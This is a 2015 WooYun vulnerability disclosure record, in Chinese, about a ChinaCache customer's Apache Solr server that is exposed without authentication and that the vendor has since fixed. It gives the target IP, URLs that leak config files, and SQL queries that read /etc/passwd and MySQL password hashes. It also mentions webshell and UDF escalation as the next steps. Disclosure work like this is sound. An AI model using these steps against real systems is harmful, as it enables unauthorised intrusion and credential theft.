{"id": 18800, "wybug_id": "wooyun-2015-0116419", "wybug_title": "Apache Solr通用SQL执行（开启上帝模式）", "wybug_corp": "ChinaCache", "wybug_author": "Wulala", "wybug_date": "2015-05-27 08:01", "wybug_open_date": "2015-07-11 10:16", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄露", "默认配置不当", "服务配置不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-27：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向公众公开  简要描述： Apache Solr可开启上帝模式，可以执行任意SQL这里以蓝汛为例，可以导致系统敏感信息泄露,可执行任意SQL. 读取系统文件等...在系统配置不当的情况下，可被渗透.. 详细说明：  1. 最近遇到这样一个系统,无须登录验证    http://223.202.67.50:8080 \n\n2. 查阅了一下文档和公开的漏洞信息   1) solr泄露数据库配置信息      http://TARGET/solr/admin/file/?file=solrconfig.xml 找到data-import中的值data-import-value.      http://TARGET/solr/admin/file/?file=data-import-value.xml   2) 低版本中存在XXE3. 第一个信息挺有价值,就沿着这个方向呗4. 自己环境和网上的环境测试了一下,对于1）公开的漏洞，其实不需要那么麻烦   配置文件solrconfig.xml： \n\n   Dataimport: \n\n不过有这些好像还不够5. 开启上帝模式 \n\n6. query=SQL   下面就可以执行任意的sql语句了     select version()   -> 5.5.13     select users()       select database()       show grants for 'zyw'@'%'     select load_file('/etc/issue')\t\t->\tCentOS 5.6     select load_file('/etc/sysconfig/network-scripts/ifcfg-eth0') ->   IPADDR=10.10.20.18     select @@basedir;     select host,user,password from mysql.user;\t\t--> root 和 zyw密码一致     select load_file('/etc/passwd');\t\t->返回 Base64 内容 \n\n    返回内容Base64解码 \n\n 7.  下面就是写webshell 或者 UDF... 内网... 8.  上面的方法都试过了,实力不济, 只能到此为止...9.  来乌云求教各路神仙...   漏洞证明：     修复方案：  添加访问验证   版权声明：转载请注明来源 Wulala@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-05-27 10:15 厂商回复： 此系统是客户在用，我们已通知客户修复漏洞，谢谢Wulala 最新状态： 2015-05-27：客户方面已将问题处理。  ", "replys": "漏洞评价：\n评论\n     2015-05-27 08:03 |    \t\t大海捞针 \t\t\t( 实习白帽子  |\t\t\t        Rank:54 漏洞数:19        | 踏清风而来)\t\t \n  坐等公开    \n     2015-05-27 21:59 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  solr。。。    \n     2015-06-05 19:50 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  等公开，无敌模式    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}